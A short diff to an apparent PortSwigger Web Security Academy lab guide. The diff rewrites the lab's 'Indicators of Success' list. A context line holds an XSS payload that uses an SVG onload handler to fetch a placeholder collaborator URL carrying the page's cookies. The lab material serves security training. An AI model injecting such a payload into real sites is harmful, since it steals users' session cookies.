@@ -23,9 +23,10 @@ This lab contains a vulnerability that is difficult to find manually. It is loca
 - `'"><svg/onload=fetch(\`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}\`)>:YOUR-SESSION-ID`
 
 ### Indicators of Success
-- Check for changes in application behavior
-- Look for error messages or data exposure
-- Verify the vulnerability type: essential-skills
-
+- Vulnerability discovered within time limit
+- Target file contents retrieved
+- Automated scanning identified issue
+- Manual testing confirmed vulnerability
+- Exploitation successful
 ---
 *Source: PortSwigger Web Security Academy*
